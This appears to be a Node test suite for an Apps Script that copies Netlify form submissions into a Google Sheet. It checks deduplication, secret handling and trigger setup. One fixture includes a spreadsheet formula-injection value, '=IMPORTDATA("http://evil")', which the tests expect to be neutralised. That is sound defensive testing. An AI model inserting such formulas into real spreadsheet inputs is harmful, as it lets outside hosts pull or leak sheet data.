import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import vm from "node:vm";

const source = readFileSync("scripts/diary-netlify-sheets-sync.gs", "utf8");
const SITE = "a1b2c3d4-1111-4444-8888-abcdef123456";
const SHEET = "1WyCH56d_FMOwoE8uJmo4uY0CKmUBLf6A4VYFQvuq0ek";
const ID = "abcdef0123456789abcdef01";

function harness({ configured = true } = {}) {
  const props = {
    NETLIFY_SITE_ID: SITE, SPREADSHEET_ID: SHEET,
    ...(configured ? { NETLIFY_API_TOKEN: "fake-test-token-long-not-secret" } : {}),
  };
  const records = [[
    "Netlify受付ID", "受付日時", "店舗・企業名", "担当者", "メール",
    "PR", "区分", "相談", "紹介", "来店", "受付元", "同期", "確認", "メモ",
  ]];
  const calls = [];
  const triggers = [];
  let submissions = [{ id: ID, created_at: "2026-10-22T12:00:00Z",
    data: { restaurant_name: "=IMPORTDATA(\"http://evil\")", email: "shop@example.jp",
      message: "+SUM(1,2)" } }];
  const sheet = {
    getLastRow: () => records.length,
    getMaxRows: () => 1000,
    getRange: (row, col, h, w) => ({
      getDisplayValues: () => records.slice(row - 1, row - 1 + h).map(v => v.slice(col - 1, col - 1 + w)),
      setValues: values => {
        if (w !== 14 || col !== 1) throw Error("Unexpected write");
        for (let i = 0; i < values.length; i++) records[row - 1 + i] = values[i];
      },
    }),
  };
  const mock = {
    PropertiesService: { getScriptProperties: () => ({
      getProperty: key => props[key] ?? null,
      setProperty: (key, value) => { props[key] = value; },
    }) },
    SpreadsheetApp: { openById: id => {
      if (id !== SHEET) throw Error("Unexpected Sheet ID");
      return { getSheetByName: name => name === "07_自動受付" ? sheet : null };
    } },
    UrlFetchApp: { fetch: (url, opts) => {
      calls.push({ url, opts });
      if (opts.headers.Authorization !== "Bearer fake-test-token-long-not-secret") throw Error("Missing secret");
      if (url.endsWith("/forms") && url.includes("/sites/")) return { getResponseCode: () => 200,
        getContentText: () => JSON.stringify([{ id: "123456789abcdef012345678", name: "diary-pr-inquiry" }]) };
      if (url.includes("/submissions?page=")) return { getResponseCode: () => 200,
        getContentText: () => JSON.stringify(submissions) };
      throw Error("External or invalid request");
    } },
    LockService: { getScriptLock: () => ({ tryLock: () => true, releaseLock: () => {} }) },
    ScriptApp: {
      getProjectTriggers: () => triggers,
      deleteTrigger: t => { triggers.splice(triggers.indexOf(t), 1); },
      newTrigger: fn => ({ timeBased: () => ({ everyMinutes: minutes => ({ create: () => triggers.push({ fn, minutes, getHandlerFunction: () => fn }) }) }) }),
    },
    console: { log: () => {} },
  };
  const context = vm.createContext(mock);
  vm.runInContext(source, context);
  return { context, records, calls, props, triggers, setSubmissions: items => { submissions = items; } };
}

test("sync only verified named form, dedupes IDs and neutralizes spreadsheet formulas", () => {
  const env = harness();
  env.context.syncDiaryNetlifyForms();
  assert.equal(env.records.length, 2);
  assert.equal(env.records[1][0], ID);
  assert.equal(env.records[1][2], "'=IMPORTDATA(\"http://evil\")");
  assert.equal(env.records[1][7], "'+SUM(1,2)");
  assert.equal(env.records[1][12], "未確認");
  assert.ok(env.props.DIARY_LAST_SUCCESS);
  env.context.syncDiaryNetlifyForms();
  assert.equal(env.records.length, 2);
  const added = { id: "abcdef0123456789abcdef02", data: { restaurant_name: "新店舗", email: "new@example.jp" } };
  env.setSubmissions([added]);
  env.context.syncDiaryNetlifyForms();
  assert.equal(env.records.length, 3);
  assert.equal(env.records[2][2], "新店舗");
  assert.ok(env.calls.every(call => call.url.startsWith("https://api.netlify.com/api/v1/")));
});

test("missing secret aborts before any network request or sheet access", () => {
  const env = harness({ configured: false });
  assert.throws(() => env.context.syncDiaryNetlifyForms(), /Script Properties/);
  assert.equal(env.records.length, 1);
  assert.equal(env.calls.length, 0);
});

test("install creates one repeating five-minute trigger only after successful sync", () => {
  const env = harness();
  env.context.setupDiaryAutoSync();
  assert.equal(env.triggers.length, 1);
  assert.equal(env.triggers[0].minutes, 5);
  env.context.setupDiaryAutoSync();
  assert.equal(env.triggers.length, 1);
  env.context.stopDiaryAutoSync();
  assert.equal(env.triggers.length, 0);
});

test("script has no direct code secrets and does not use unavailable V8 Web APIs", () => {
  assert.doesNotMatch(source, /\bnew URL\b|\bwindow\b|\blocalStorage\b/);
  assert.doesNotMatch(source, /getProperty\('NETLIFY_API_TOKEN'\).*getContentText/);
  assert.doesNotMatch(source, /https:\/\/hooks\.zapier\.com|script\.google\.com\/macros\/s\/\w+/);
  assert.match(source, /followRedirects: false/);
  assert.match(source, /LockService\.getScriptLock/);
});
